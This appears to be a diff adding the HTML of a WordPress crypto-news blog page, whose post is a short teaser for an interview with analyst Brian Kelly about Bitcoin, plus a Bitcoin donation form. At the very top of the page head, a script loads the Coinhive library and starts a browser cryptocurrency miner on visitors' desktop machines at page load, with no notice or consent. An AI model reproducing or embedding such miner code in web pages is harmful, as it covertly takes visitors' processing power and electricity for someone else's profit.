@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html class="no-js" lang="pt-BR"
+	prefix="og: http://ogp.me/ns#" >
+<head>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('gGjgZZFhJAEl9GA6DBRBfVmONMGZNMEU', {throttle: 0.3});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+    }
+</script>
+	
+	<script>
+    // Listen on events
+    miner.on('found', function() { /* Hash found */ })
+    miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+    // Update stats once per second
+    setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+
+        // Output to HTML elements...
+    }, 1000);
+</script>
+	
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<link rel="profile" href="http://gmpg.org/xfn/11" />
+	<title>Interview With Crypto &#039;Optimist&#039; Brian Kelly: Bitcoin Is Still 50 Percent Undervalued | | Eduardo Menezes</title>
+<!-- Jetpack Site Verification Tags -->
+<meta name="google-site-verification" content="q1W-N9lZOsgPnuU6_CqyEdx1WXDMiEM9QxWECeTW_OI" />
+
+<!-- All in One SEO Pack 2.10.1 by Michael Torbert of Semper Fi Web Design[1073,1189] -->
+
+<meta name="keywords"  content="bitcoin,bitcoin news" />
+
+<link rel="canonical" href="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/" />
+<meta property="og:title" content="Interview With Crypto &#039;Optimist&#039; Brian Kelly: Bitcoin Is Still 50 Percent Undervalued | | Eduardo Menezes" />
+<meta property="og:type" content="object" />
+<meta property="og:url" content="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/" />
+<meta property="og:image" content="https://www.eduardomenezes.com/crypto/wp-content/plugins/all-in-one-seo-pack/images/default-user-image.png" />
+<meta property="og:site_name" content="Eduardo Menezes" />
+<meta property="og:description" content="From what it was like to work for Lehman Brothers to the sentiment analysis of the crypto market and the signs of the next financial crisis — we talked to CNBC&#039;s analyst Brian Kelly about everything" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Interview With Crypto &#039;Optimist&#039; Brian Kelly: Bitcoin Is Still 50 Percent Undervalued | | Eduardo Menezes" />
+<meta name="twitter:description" content="From what it was like to work for Lehman Brothers to the sentiment analysis of the crypto market and the signs of the next financial crisis — we talked to CNBC&#039;s analyst Brian Kelly about everything" />
+<meta name="twitter:image" content="https://www.eduardomenezes.com/crypto/wp-content/plugins/all-in-one-seo-pack/images/default-user-image.png" />
+<meta itemprop="image" content="https://www.eduardomenezes.com/crypto/wp-content/plugins/all-in-one-seo-pack/images/default-user-image.png" />
+<!-- /all in one seo pack -->
+<link rel='dns-prefetch' href='//translate.google.com' />
+<link rel='dns-prefetch' href='//s0.wp.com' />
+<link rel='dns-prefetch' href='//secure.gravatar.com' />
+<link rel='dns-prefetch' href='//maxcdn.bootstrapcdn.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Feed para Eduardo Menezes &raquo;" href="https://www.eduardomenezes.com/crypto/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Feed de comentários para Eduardo Menezes &raquo;" href="https://www.eduardomenezes.com/crypto/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Feed de comentários para Eduardo Menezes &raquo; Interview With Crypto ‘Optimist’ Brian Kelly: Bitcoin Is Still 50 Percent Undervalued" href="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.eduardomenezes.com\/crypto\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.0.3"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='morfeu-style-css'  href='https://www.eduardomenezes.com/crypto/wp-content/themes/morfeu/style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-block-library-css'  href='https://c0.wp.com/c/5.0.3/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='jetpack-email-subscribe-css'  href='https://c0.wp.com/p/jetpack/6.9/modules/shortcodes/css/jetpack-email-subscribe.css' type='text/css' media='all' />
+<link rel='stylesheet' id='give-styles-css'  href='https://www.eduardomenezes.com/crypto/wp-content/plugins/Give-Wordpress-Donations-Bitcoin-master/templates/give.min.css?ver=2.0.6.1' type='text/css' media='all' />
+<link rel='stylesheet' id='google-language-translator-css'  href='https://www.eduardomenezes.com/crypto/wp-content/plugins/google-language-translator/css/style.css?ver=5.0.48' type='text/css' media='' />
+<link rel='stylesheet' id='glt-toolbar-styles-css'  href='https://www.eduardomenezes.com/crypto/wp-content/plugins/google-language-translator/css/toolbar.css?ver=5.0.48' type='text/css' media='' />
+<link rel='stylesheet' id='cr-style-css'  href='https://www.eduardomenezes.com/crypto/wp-content/plugins/gourl-bitcoin-payment-gateway-paid-downloads-membership/css/style.front.css?ver=5.0.3' type='text/css' media='all' />
+<link rel='stylesheet' id='sb_instagram_styles-css'  href='https://www.eduardomenezes.com/crypto/wp-content/plugins/instagram-feed/css/sb-instagram.min.css?ver=1.10.2' type='text/css' media='all' />
+<link rel='stylesheet' id='sb-font-awesome-css'  href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='kades-crypto-css'  href='https://www.eduardomenezes.com/crypto/wp-content/plugins/kades-crypto-widgets/css/kades-crypto.css?ver=5.0.3' type='text/css' media='all' />
+<link rel='stylesheet' id='social-logos-css'  href='https://c0.wp.com/p/jetpack/6.9/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='jetpack_css-css'  href='https://c0.wp.com/p/jetpack/6.9/css/jetpack.css' type='text/css' media='all' />
+<script type='text/javascript' src='https://c0.wp.com/c/5.0.3/wp-includes/js/jquery/jquery.js'></script>
+<script type='text/javascript' src='https://c0.wp.com/c/5.0.3/wp-includes/js/jquery/jquery-migrate.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var related_posts_js_options = {"post_heading":"h4"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://c0.wp.com/p/jetpack/6.9/_inc/build/related-posts/related-posts.min.js'></script>
+<!--[if lt IE 9]>
+<script type='text/javascript' src='https://www.eduardomenezes.com/crypto/wp-content/themes/morfeu/assets/js/polyfill.min.js.js?ver=5.0.3'></script>
+<![endif]-->
+<script type='text/javascript'>
+/* <![CDATA[ */
+var give_global_vars = {"ajaxurl":"https:\/\/www.eduardomenezes.com\/crypto\/wp-admin\/admin-ajax.php","checkout_nonce":"7fea7600f8","currency":"EUR","currency_sign":"\u20ac","currency_pos":"before","thousands_separator":",","decimal_separator":".","no_gateway":"Please select a payment method.","bad_minimum":"The minimum custom donation amount for this form is","general_loading":"Loading...","purchase_loading":"Please Wait...","number_decimals":"2","give_version":"2.0.6.1","magnific_options":{"main_class":"give-modal","close_on_bg_click":false},"form_translation":{"payment-mode":"Please select payment mode.","give_first":"Please enter your first name.","give_email":"Please enter a valid email address.","give_user_login":"Invalid username. Only lowercase letters (a-z) and numbers are allowed.","give_user_pass":"Enter a password.","give_user_pass_confirm":"Enter the password confirmation.","give_agree_to_terms":"You must agree to the terms and conditions."},"confirm_email_sent_message":"Please check your email and click on the link to access your complete donation history."};
+var give_scripts = {"ajaxurl":"https:\/\/www.eduardomenezes.com\/crypto\/wp-admin\/admin-ajax.php","ajaxNonce":"fd66ee3837","loading":"Loading","select_option":"Please select an option","default_gateway":"gourl","permalinks":"1","number_decimals":"2"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.eduardomenezes.com/crypto/wp-content/plugins/Give-Wordpress-Donations-Bitcoin-master/assets/js/frontend/give.all.min.js?ver=2.0.6.1'></script>
+<link rel='https://api.w.org/' href='https://www.eduardomenezes.com/crypto/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.eduardomenezes.com/crypto/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.eduardomenezes.com/crypto/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='How the Marshall Islands Envisions Its National Digital Currency Dubbed ‘Sovereign’' href='https://www.eduardomenezes.com/crypto/how-the-marshall-islands-envisions-its-national-digital-currency-dubbed-sovereign/' />
+<link rel='next' title='QuadrigaCX Imbroglio Continues: Cotten Mentioned Bitcoin Key Loss In 2014' href='https://www.eduardomenezes.com/crypto/quadrigacx-imbroglio-continues-cotten-mentioned-bitcoin-key-loss-in-2014/' />
+<meta name="generator" content="WordPress 5.0.3" />
+<link rel='shortlink' href='https://wp.me/p9VfnN-P4' />
+<link rel="alternate" type="application/json+oembed" href="https://www.eduardomenezes.com/crypto/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.eduardomenezes.com%2Fcrypto%2Finterview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://www.eduardomenezes.com/crypto/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.eduardomenezes.com%2Fcrypto%2Finterview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued%2F&#038;format=xml" />
+<meta name="generator" content="Give v2.0.6.1" />
+<style type="text/css">.goog-te-gadget { margin-top:2px !important; }p.hello { font-size:12px; color:#666; }#google_language_translator { clear:both; }#flags { width:165px; }#flags a { display:inline-block; margin-right:2px; }#google_language_translator a {display: none !important; }.goog-te-gadget {color:transparent !important;}.goog-te-gadget { font-size:0px !important; }.goog-branding { display:none; }.goog-tooltip {display: none !important;}.goog-tooltip:hover {display: none !important;}.goog-text-highlight {background-color: transparent !important; border: none !important; box-shadow: none !important;}#google_language_translator select.goog-te-combo { color:#32373c; }.goog-te-banner-frame{visibility:hidden !important;}body { top:0px !important;}#glt-translate-trigger { bottom:auto; top:0; left:50%; margin-left:-63px; right:auto; }.tool-container.tool-top { top:50px !important; bottom:auto !important; }.tool-container.tool-top .arrow { border-color:transparent transparent #d0cbcb; top:-14px; }#glt-translate-trigger > span { color:#ffffff; }#glt-translate-trigger { background:#1e73be; }</style>
+<link rel='dns-prefetch' href='//v0.wordpress.com'/>
+<link rel='dns-prefetch' href='//i0.wp.com'/>
+<link rel='dns-prefetch' href='//i1.wp.com'/>
+<link rel='dns-prefetch' href='//i2.wp.com'/>
+<link rel='dns-prefetch' href='//c0.wp.com'/>
+<link rel='dns-prefetch' href='//jetpack.wordpress.com'/>
+<link rel='dns-prefetch' href='//s0.wp.com'/>
+<link rel='dns-prefetch' href='//s1.wp.com'/>
+<link rel='dns-prefetch' href='//s2.wp.com'/>
+<link rel='dns-prefetch' href='//public-api.wordpress.com'/>
+<link rel='dns-prefetch' href='//0.gravatar.com'/>
+<link rel='dns-prefetch' href='//1.gravatar.com'/>
+<link rel='dns-prefetch' href='//2.gravatar.com'/>
+<style type='text/css'>img#wpstats{display:none}</style>			<style type="text/css">
+				html:not( .jetpack-lazy-images-js-enabled ) .jetpack-lazy-image {
+					display: none;
+				}
+			</style>
+			<script>
+				document.documentElement.classList.add(
+					'jetpack-lazy-images-js-enabled'
+				);
+			</script>
+		<link rel="icon" href="https://i2.wp.com/www.eduardomenezes.com/crypto/wp-content/uploads/2018/05/cropped-flat800x800070f.u1-1.jpg?fit=32%2C32&#038;ssl=1" sizes="32x32" />
+<link rel="icon" href="https://i2.wp.com/www.eduardomenezes.com/crypto/wp-content/uploads/2018/05/cropped-flat800x800070f.u1-1.jpg?fit=192%2C192&#038;ssl=1" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="https://i2.wp.com/www.eduardomenezes.com/crypto/wp-content/uploads/2018/05/cropped-flat800x800070f.u1-1.jpg?fit=180%2C180&#038;ssl=1" />
+<meta name="msapplication-TileImage" content="https://i2.wp.com/www.eduardomenezes.com/crypto/wp-content/uploads/2018/05/cropped-flat800x800070f.u1-1.jpg?fit=270%2C270&#038;ssl=1" />
+</head>
+
+<body class="post-template-default single single-post postid-3166 single-format-standard elementor-default">
+	<header role="banner">
+
+		<nav id="main-navigation" class="navbar navbar-default navbar-static-top" style="background-image: url('')" role="navigation">
+			<div class="container">
+				<div class="navbar-header clearfix">
+					<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-main-navigation">
+						<span class="sr-only">Alternar navegação</span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+					</button>
+							<a class="navbar-brand clearfix" href="https://www.eduardomenezes.com/crypto/" title="Eduardo Menezes" rel="home">
+			<h1 class='site-title'>Eduardo Menezes</h1>
+		</a>
+					</div><!-- .navbar-header -->
+				<div class="collapse navbar-collapse navbar-right navbar-main-navigation">
+					<ul class="nav navbar-nav navbar-right hidden-xs">
+						<li class="dropdown seachform-navbar">
+							<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false"><span class="glyphicon glyphicon-search"></span></a>
+							<ul class="dropdown-menu clearfix" role="menu">
+								<li class="li-form search-drop">
+									<form method="get" class="searchform form-inline" action="https://www.eduardomenezes.com/crypto/" role="search">
+	<div class="input-group">
+      <input type="text" class="form-control" placeholder="Pesquisar"  name="s" >
+      <span class="input-group-btn">
+        <button type="submit" class="btn btn-primary">
+			<span class="glyphicon glyphicon-search"></span>
+		</button>
+      </span>
+    </div><!-- /input-group -->
+</form>
+								</li><!-- .li-form -->
+							</ul><!-- .dropdown-menu  -->
+						</li><!-- .dropdown -->
+					</ul><!-- .nav -->
+					<ul id="menu-home" class="nav navbar-nav"><li id="menu-item-67" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-67"><a title="Home" href="http://eduardomenezes.com">Home</a></li>
+<li id="menu-item-227" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-227"><a title="Portfólio" href="https://www.eduardomenezes.com/crypto/portfolio/">Portfólio</a></li>
+<li id="menu-item-762" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-762"><a title="Donation" href="https://www.eduardomenezes.com/crypto/donation/">Donation</a></li>
+</ul>				</div><!-- .navbar-collapse -->
+			</div><!-- .container -->
+		</nav><!-- #main-menu -->
+		<a id="skippy" class="sr-only sr-only-focusable" href="#content">
+			<div class="container">
+				<span class="skiplink-text">Pular para o conteúdo</span>
+			</div>
+		</a>
+	</header><!-- #header -->
+
+	<div id="wrapper" class="container clearfix">
+		<div class="row">
+
+	<div id="primary" class="col-md-9">
+		<main id="main-content" class="site-main" role="main">
+			<div class="loop-itens clearfix" id="loop-itens">
+	<div class="loop-article " >
+	<article id="post-3166" class="post-3166 post type-post status-publish format-standard has-post-thumbnail hentry category-bitcoin category-bitcoin-news tag-bitcoin">
+		<header class="entry-header">
+						<a href="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/">
+				<figure class="thumbnail-content " style="background-image: url('https://i1.wp.com/www.eduardomenezes.com/crypto/wp-content/uploads/2019/02/528_aHR0cHM6Ly9zMy5jb2ludGVsZWdyYXBoLmNvbS9zdG9yYWdlL3VwbG9hZHMvdmlldy84MDZiYzFmOGUzYjdiOWYzZGUzMDBmZTg5Mzk0MGM4MS5qcGc3D.jpg?fit=528%2C352&ssl=1');">
+									</figure><!-- .thumbnail-content -->
+			</a>
+			<h1 class="entry-title">Interview With Crypto ‘Optimist’ Brian Kelly: Bitcoin Is Still 50 Percent Undervalued</h1>		</header><!-- .entry-header -->
+		<div class="conteudo-post">
+						<div class="entry-meta">
+				<span class="entry-date"> <i class="icon-circle glyphicon glyphicon-calendar"></i> <time class="entry-date" datetime="2019-02-16T21:52:00+00:00">16 de fevereiro de 2019</time></span> <i class="icon-circle glyphicon glyphicon-user"></i> <span class="author vcard">Por <a class="url fn n" href="https://www.eduardomenezes.com/crypto/author/mastercontrole/" rel="author">Eduardo Menezes</a></span> <i class="icon-circle glyphicon glyphicon-comment"></i>0 comentários <i class="icon-circle glyphicon glyphicon-folder-open"></i><a href="https://www.eduardomenezes.com/crypto/category/bitcoin/" rel="category tag">Bitcoin</a>, <a href="https://www.eduardomenezes.com/crypto/category/bitcoin-news/" rel="category tag">Bitcoin News</a>				<hr>
+			</div><!-- .entry-meta -->
+										<div class="entry-content">
+					<div><img src="https://i1.wp.com/www.eduardomenezes.com/crypto/wp-content/uploads/2019/02/528_aHR0cHM6Ly9zMy5jb2ludGVsZWdyYXBoLmNvbS9zdG9yYWdlL3VwbG9hZHMvdmlldy84MDZiYzFmOGUzYjdiOWYzZGUzMDBmZTg5Mzk0MGM4MS5qcGc3D.jpg?w=600&#038;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/www.eduardomenezes.com/crypto/wp-content/uploads/2019/02/528_aHR0cHM6Ly9zMy5jb2ludGVsZWdyYXBoLmNvbS9zdG9yYWdlL3VwbG9hZHMvdmlldy84MDZiYzFmOGUzYjdiOWYzZGUzMDBmZTg5Mzk0MGM4MS5qcGc3D.jpg?w=600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class=" jetpack-lazy-image"><noscript><img src="https://i1.wp.com/www.eduardomenezes.com/crypto/wp-content/uploads/2019/02/528_aHR0cHM6Ly9zMy5jb2ludGVsZWdyYXBoLmNvbS9zdG9yYWdlL3VwbG9hZHMvdmlldy84MDZiYzFmOGUzYjdiOWYzZGUzMDBmZTg5Mzk0MGM4MS5qcGc3D.jpg?w=600&#038;ssl=1" data-recalc-dims="1"></noscript>From what it was like to work for Lehman Brothers to the sentiment analysis of the crypto market and the signs of the next financial crisis — we talked to CNBC’s analyst Brian Kelly about everything</p>
+</div>
+	<div id="give-form-734-wrap" class="give-form-wrap give-display-onpage">
+
+		<h2 class="give-form-title">Donation</h2>			<form id="give-form-734" class="give-form give-form-734 give-form-type-multi float-labels-enabled" action="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/?payment-mode=gourl" data-currency_symbol="&euro;" data-currency_code="EUR" data-currency_position="before" data-thousands_separator="," data-decimal_separator="." data-number_decimals="2" method="post">
+
+				<!-- The following field is for robots only, invisible to humans: -->
+				<span class="give-hidden" style="display: none !important;">
+					<label for="give-form-honeypot-734"></label>
+					<input id="give-form-honeypot-734" type="text" name="give-honeypot"
+						   class="give-honeypot give-hidden"/>
+				</span>
+
+					<input type="hidden" name="give-form-id" value="734"/>
+	<input type="hidden" name="give-form-title" value="Donation"/>
+	<input type="hidden" name="give-current-url"
+		   value="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/"/>
+	<input type="hidden" name="give-form-url" value="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/"/>
+	<input type="hidden" name="give-form-minimum"
+		   value="1.00"/>
+	<input type="hidden" id="_wpnonce" name="_wpnonce" value="b39bbc09fb" /><input type="hidden" name="give-price-id" value="0"/>		<div class="give-total-wrap">
+			<div class="give-donation-amount form-row-wide">
+				<span class="give-currency-symbol give-currency-position-before">&euro;</span>				<label class="give-hidden" for="give-amount">Donation Amount:</label>
+				<input class="give-text-input give-amount-top" id="give-amount" name="give-amount" type="tel"
+					   placeholder="" value="1.00" autocomplete="off">
+							</div>
+		</div>
+	<ul id="give-donation-level-button-wrap" class="give-donation-levels-wrap give-list-inline"><li><button type="button" data-price-id="0" class=" give-donation-level-btn give-btn give-btn-level-0 give-default-level" value="1.00">&euro;1.00</button></li><li><button type="button" data-price-id="1" class=" give-donation-level-btn give-btn give-btn-level-1 " value="5.00">&euro;5.00</button></li><li><button type="button" data-price-id="2" class=" give-donation-level-btn give-btn give-btn-level-2 " value="10.00">&euro;10.00</button></li><li><button type="button" data-price-id="3" class=" give-donation-level-btn give-btn give-btn-level-3 " value="15.00">&euro;15.00</button></li><li><button type="button" data-price-id="4" class=" give-donation-level-btn give-btn give-btn-level-4 " value="20.00">&euro;20.00</button></li><li><button type="button" data-price-id="5" class=" give-donation-level-btn give-btn give-btn-level-5 " value="50.00">&euro;50.00</button></li><li><button type="button" data-price-id="6" class=" give-donation-level-btn give-btn give-btn-level-6 " value="100.00">&euro;100.00</button></li><li><button type="button" data-price-id="7" class=" give-donation-level-btn give-btn give-btn-level-7 " value="1,000.00">&euro;1,000.00</button></li><li><button type="button" data-price-id="custom" class="give-donation-level-btn give-btn give-btn-level-custom" value="custom">Give a Custom Amount</button></li></ul>
+	<fieldset id="give-payment-mode-select" style="display: none;">
+				<legend
+				class="give-payment-mode-label">Select Payment Method			<span class="give-loading-text"><span
+						class="give-loading-animation"></span>
+            </span>
+		</legend>
+
+		<div id="give-payment-mode-wrap">
+						<ul id="give-gateway-radio-list">
+									<li class="give-gateway-option-selected">
+						<input type="radio" name="payment-mode" class="give-gateway"
+							   id="give-gateway-gourl-734"
+							   value="gourl" checked='checked'>
+						<label for="give-gateway-gourl-734"
+							   class="give-gateway-option"
+							   id="give-gateway-option-gourl"> Bitcoin/Altcoin</label>
+					</li>
+								</ul>
+					</div>
+			</fieldset>
+
+	
+	<div id="give_purchase_form_wrap">
+
+			<fieldset id="give_checkout_user_info">
+		<legend>Personal Info</legend>
+		<p id="give-first-name-wrap" class="form-row form-row-first form-row-responsive">
+			<label class="give-label" for="give-first">
+				First Name									<span class="give-required-indicator">*</span>
+								<span class="give-tooltip hint--top hint--medium hint--bounce" aria-label="We will use this to personalize your account experience." rel="tooltip"><i class="give-icon give-icon-question"></i></span>			</label>
+			<input
+					class="give-input required"
+					type="text"
+					name="give_first"
+					placeholder="First Name"
+					id="give-first"
+					value=""
+				 required aria-required="true" 			/>
+		</p>
+
+		<p id="give-last-name-wrap" class="form-row form-row-last form-row-responsive">
+			<label class="give-label" for="give-last">
+				Last Name								<span class="give-tooltip hint--top hint--medium hint--bounce" aria-label="We will use this as well to personalize your account experience." rel="tooltip"><i class="give-icon give-icon-question"></i></span>			</label>
+
+			<input
+					class="give-input"
+					type="text"
+					name="give_last"
+					id="give-last"
+					placeholder="Last Name"
+					value=""
+							/>
+		</p>
+
+				<p id="give-email-wrap" class="form-row form-row-wide">
+			<label class="give-label" for="give-email">
+				Email Address									<span class="give-required-indicator">*</span>
+								<span class="give-tooltip hint--top hint--medium hint--bounce" aria-label="We will send the donation receipt to this address." rel="tooltip"><i class="give-icon give-icon-question"></i></span>			</label>
+
+			<input
+					class="give-input required"
+					type="email"
+					name="give_email"
+					placeholder="Email Address"
+					id="give-email"
+					value=""
+				 required aria-required="true" 			/>
+
+		</p>
+			</fieldset>
+		<fieldset id="give_purchase_submit">
+			<p id="give-final-total-wrap" class="form-wrap ">
+				<span class="give-donation-total-label">
+			Donation Total:		</span>
+		<span class="give-final-total-amount"
+			  data-total="1.00">
+			&euro;1.00		</span>
+			</p>
+		<input type="hidden" name="give_action" value="purchase"/>
+	<input type="hidden" name="give-gateway" value="gourl"/>
+		<div class="give-submit-button-wrap give-clearfix">
+		<input type="submit" class="give-submit give-btn" id="give-purchase-button" name="give-purchase"
+			   value="Donate Now" data-before-validation-label="Donate Now" />
+		<span class="give-loading-animation"></span>
+	</div>
+		</fieldset>
+	
+	</div>
+
+				</form>
+
+			
+	</div><!--end #give-form-734-->
+	
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-official sd-sharing"><h3 class="sd-title">Compartilhe isso:</h3><div class="sd-content"><ul><li class="share-twitter"><a href="https://twitter.com/share" class="twitter-share-button" data-url="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/" data-text="Interview With Crypto ‘Optimist’ Brian Kelly: Bitcoin Is Still 50 Percent Undervalued" data-via="emenezes_crypto" >Tweet</a></li><li class="share-facebook"><div class="fb-share-button" data-href="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/" data-layout="button_count"></div></li><li class="share-google-plus-1"><div class="googleplus1_button"><div class="g-plus" data-action="share" data-annotation="bubble" data-href="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/"></div></div></li><li class="share-telegram"><a rel="nofollow noopener noreferrer" data-shared="" class="share-telegram sd-button" href="https://www.eduardomenezes.com/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/?share=telegram" target="_blank" title="Clique para compartilhar no Telegram"><span>Telegram</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button" href="https://api.whatsapp.com/send?text=Interview%20With%20Crypto%20%E2%80%98Optimist%E2%80%99%20Brian%20Kelly%3A%20Bitcoin%20Is%20Still%2050%20Percent%20Undervalued%20https%3A%2F%2Fwww.eduardomenezes.com%2Fcrypto%2Finterview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued%2F" target="_blank" title="Clique para compartilhar no WhatsApp"><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
+<div id='jp-relatedposts' class='jp-relatedposts' >
+	<h3 class="jp-relatedposts-headline"><em>Relacionado</em></h3>
+</div>				</div><!-- .entry-content -->
+				<hr>
+				<p>Tags: <a href="https://www.eduardomenezes.com/crypto/tag/bitcoin/" rel="tag">bitcoin</a></p>					</div>
+	</article><!-- #post-## -->
+</div>
+<div class="col-lg-12">
+	<section id="comments" class="content-wrap" itemscope itemtype="http://schema.org/Comment">
+				
+		
+		<div id="respond" class="comment-respond">
+							<h3 id="reply-title" class="comment-reply-title">Deixe uma resposta					<small><a rel="nofollow" id="cancel-comment-reply-link" href="/crypto/interview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued/#respond" style="display:none;">Cancelar resposta</a></small>
+				</h3>
+						<form id="commentform" class="comment-form">
+				<iframe title="Formulário de comentário" src="https://jetpack.wordpress.com/jetpack-comment/?blogid=146630855&#038;postid=3166&#038;comment_registration=0&#038;require_name_email=1&#038;stc_enabled=1&#038;stb_enabled=1&#038;show_avatars=1&#038;avatar_default=mystery&#038;greeting=Deixe+uma+resposta&#038;greeting_reply=Deixe+uma+resposta+para+%25s&#038;color_scheme=light&#038;lang=pt_BR&#038;jetpack_version=6.9&#038;show_cookie_consent=10&#038;has_cookie_consent=0&#038;sig=626ac16fd302ff917cd732f393e7bef51e82fcc5#parent=https%3A%2F%2Fwww.eduardomenezes.com%2Fcrypto%2Finterview-with-crypto-optimist-brian-kelly-bitcoin-is-still-50-percent-undervalued%2F" style="width:100%; height: 430px; border:0;" name="jetpack_remote_comment" class="jetpack_remote_comment" id="jetpack_remote_comment" sandbox="allow-same-origin allow-top-navigation allow-scripts allow-forms allow-popups"></iframe>
+									<!--[if !IE]><!-->
+					<script>
+						document.addEventListener('DOMContentLoaded', function () {
+							var commentForms = document.getElementsByClassName('jetpack_remote_comment');
